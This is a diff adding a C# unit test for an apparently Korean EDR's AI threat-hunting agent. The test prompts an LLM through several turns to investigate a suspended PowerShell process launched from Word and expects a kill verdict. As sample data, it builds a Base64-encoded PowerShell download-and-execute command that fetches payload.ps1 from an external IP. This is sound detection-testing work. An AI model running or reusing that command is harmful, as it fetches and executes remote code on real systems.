@@ -419,6 +419,155 @@ public class AutonomousHunterAgentTests
         }
     }
 
+    [Fact]
+    public async Task TestPrintLiveMultiTurnPromptsAndResponses()
+    {
+        var client = await GeminiRestClient.TryCreateFromMundusVivensConfigAsync(modelName: "gemini-3.8-flash");
+        Assert.NotNull(client);
+
+        string systemInstruction = """
+            당신은 최첨단 엔터프라이즈 보안 EDR 'Phalanx'의 자율 AI 위협 헌터(Autonomous Hunter Agent)입니다.
+            Windows 커널 센서가 선제 동결한 회색지대 프로세스를 심층 조사하여 악성 여부를 가리고 사형(ACTION_KILL) 또는 동결해제(ACTION_RESUME)를 최종 판결해야 합니다.
+            
+            사용 가능한 5대 OS 조사 도구 목록:
+            1. DecodePayloadTool: Base64/Hex 난독화 명령줄 해독 (인자: encodedCommand)
+            2. ProcessMemoryScanTool: 동결된 프로세스 가상 메모리(RAM) 스캔 (인자: targetPid)
+            3. ThreatReputationTool: 추출된 IP/도메인 위협 평판 조회 (인자: targetIndicator)
+            4. MitreClassifierTool: 관찰된 행위를 MITRE ATT&CK Matrix TTP로 매핑 (인자: observedBehavior)
+            5. SystemFirewallTool: 악성 C2 통신 IP 윈도우 방화벽 인/아웃바운드 차단 (인자: maliciousIp)
+
+            [ReAct 멀티턴 에이전트 행동 규칙]
+            - 초기 단계에서는 증거가 불충분하므로 즉시 최종 판결을 내리지 말고 적절한 도구를 호출하십시오.
+            - 도구를 호출할 때에는 반드시 "is_final_verdict": false 로 설정하고, "action_tool"과 "action_args"를 명시하십시오.
+            - 도구 실행 결과([Observation])가 제공되면, 이를 바탕으로 다음 도구를 호출하거나 증거가 충분할 경우 최종 판결을 내리십시오.
+            - 최종 판결 시에는 반드시 "is_final_verdict": true 로 설정하고, "action_tool": "None", "verdict_action"("ACTION_KILL" 또는 "ACTION_RESUME"), "confidence_score", "summary_title", "narrative", "mitre_tactics"를 모두 작성하십시오.
+
+            반드시 아래 JSON 스키마 형식으로만 응답하십시오:
+            {
+              "thought": "프로세스 족보 및 도구 관찰 결과를 분석한 심층 추론 및 다음 행동 이유",
+              "action_tool": "호출할 도구 이름 (예: DecodePayloadTool, ProcessMemoryScanTool 등) 또는 최종 판결 시 'None'",
+              "action_args": { "인자명": "값" },
+              "is_final_verdict": true 또는 false,
+              "verdict_action": "ACTION_KILL" 또는 "ACTION_RESUME" (최종 판결 시 필수),
+              "confidence_score": 0.98,
+              "summary_title": "침해사고 한 줄 요약",
+              "narrative": "사건 발단부터 동결, 도구 조사 결과, 최종 사살/해제에 이르는 한국어 공식 침해사고 서사",
+              "mitre_tactics": ["T1566.001", "T1059.001"]
+            }
+            """;
+
+        string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
+        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
+        string fullCmd = $"powershell.exe -enc {b64}";
+
+        string userPromptTurn1 = $"""
+            [동결된 타깃 프로세스 정보]
+            - PID: 8492
+            - 실행 이미지: powershell.exe
+            - 명령줄 인자: {fullCmd}
+            - 부모 프로세스: winword.exe (PID: 3104)
+            - 전체 족보 체인: powershell.exe(PID:8492) -> winword.exe(PID:3104)
+            - 상태: 동결됨(SUSPENDED, 24μs 원자적 동결 완료)
+            
+            타깃 프로세스의 위험성을 평가하고, 첫 번째로 실행할 OS 조사 도구를 JSON 형식으로 요청하십시오. (초기 단계에서는 is_final_verdict: false 로 도구를 호출해야 합니다)
+            """;
+
+        var conversation = new List<Content>
+        {
+            new Content("user", new List<Part> { new Part(userPromptTurn1) })
+        };
+
+        _output.WriteLine("================================================================================");
+        _output.WriteLine(">>> [TURN 1: LLM 입력 프롬프트 (User Prompt)] <<<");
+        _output.WriteLine("================================================================================");
+        _output.WriteLine(userPromptTurn1);
+
+        // Turn 1 추론 호출
+        string turn1Response = await client.GenerateContentAsync(conversation, systemInstruction);
+        _output.WriteLine("\n================================================================================");
+        _output.WriteLine("<<< [TURN 1: LLM 출력 응답 (Model Response)] <<<");
+        _output.WriteLine("================================================================================");
+        _output.WriteLine(turn1Response);
+
+        conversation.Add(new Content("model", new List<Part> { new Part(turn1Response) }));
+
+        // C# 도구(DecodePayloadTool) 실제 실행
+        var decodeTool = new DecodePayloadTool();
+        var toolResult = await decodeTool.ExecuteAsync(new() { ["encodedCommand"] = fullCmd });
+
+        _output.WriteLine("\n================================================================================");
+        _output.WriteLine("⚙️ [C# 도구 실제 실행 결과 (Tool Observation)] ⚙️");
+        _output.WriteLine("================================================================================");
+        _output.WriteLine(toolResult.Output);
+
+        string userPromptTurn2 = $"""
+            [Observation - 도구 'DecodePayloadTool' 실행 결과]
+            {toolResult.Output}
+
+            위 관찰 결과를 바탕으로 다음 조치(추가 도구 호출 또는 is_final_verdict: true 최종 판결)를 결정하십시오.
+            """;
+
+        conversation.Add(new Content("user", new List<Part> { new Part(userPromptTurn2) }));
+
+        _output.WriteLine("\n================================================================================");
+        _output.WriteLine(">>> [TURN 2: LLM 입력 피드백 (Observation Feedback Prompt)] <<<");
+        _output.WriteLine("================================================================================");
+        _output.WriteLine(userPromptTurn2);
+
+        // Turn 2 추론 호출
+        string turn2Response = await client.GenerateContentAsync(conversation, systemInstruction);
+        _output.WriteLine("\n================================================================================");
+        _output.WriteLine("<<< [TURN 2: LLM 최종 출력 응답 (Final Verdict Model Response)] <<<");
+        _output.WriteLine("================================================================================");
+        _output.WriteLine(turn2Response);
+
+        var turn2Decision = LlmJsonParser.DeserializeSafe<AiInvestigationDecision>(turn2Response);
+        Assert.NotNull(turn2Decision);
+
+        if (!turn2Decision.IsFinalVerdict && turn2Decision.ActionTool == "ThreatReputationTool")
+        {
+            conversation.Add(new Content("model", new List<Part> { new Part(turn2Response) }));
+
+            var repTool = new ThreatReputationTool();
+            var repResult = await repTool.ExecuteAsync(new() { ["targetIndicator"] = "185.220.101.5" });
+
+            _output.WriteLine("\n================================================================================");
+            _output.WriteLine("⚙️ [C# 2차 도구 실제 실행 결과 (Tool Observation: ThreatReputationTool)] ⚙️");
+            _output.WriteLine("================================================================================");
+            _output.WriteLine(repResult.Output);
+
+            string userPromptTurn3 = $"""
+                [Observation - 도구 'ThreatReputationTool' 실행 결과]
+                {repResult.Output}
+
+                위 관찰 결과를 바탕으로 최종 판결(is_final_verdict: true)을 결정하십시오.
+                """;
+
+            conversation.Add(new Content("user", new List<Part> { new Part(userPromptTurn3) }));
+
+            _output.WriteLine("\n================================================================================");
+            _output.WriteLine(">>> [TURN 3: LLM 입력 피드백 (Observation Feedback Prompt)] <<<");
+            _output.WriteLine("================================================================================");
+            _output.WriteLine(userPromptTurn3);
+
+            string turn3Response = await client.GenerateContentAsync(conversation, systemInstruction);
+            _output.WriteLine("\n================================================================================");
+            _output.WriteLine("<<< [TURN 3: LLM 최종 출력 응답 (Final Verdict Model Response)] <<<");
+            _output.WriteLine("================================================================================");
+            _output.WriteLine(turn3Response);
+
+            var finalDecision = LlmJsonParser.DeserializeSafe<AiInvestigationDecision>(turn3Response);
+            Assert.NotNull(finalDecision);
+            Assert.True(finalDecision.IsFinalVerdict);
+            Assert.Equal("ACTION_KILL", finalDecision.VerdictAction);
+        }
+        else
+        {
+            Assert.True(turn2Decision.IsFinalVerdict);
+            Assert.Equal("ACTION_KILL", turn2Decision.VerdictAction);
+        }
+    }
+
     private class MockHttpMessageHandler : HttpMessageHandler
     {
         private readonly Func<HttpRequestMessage, HttpResponseMessage> _handler;
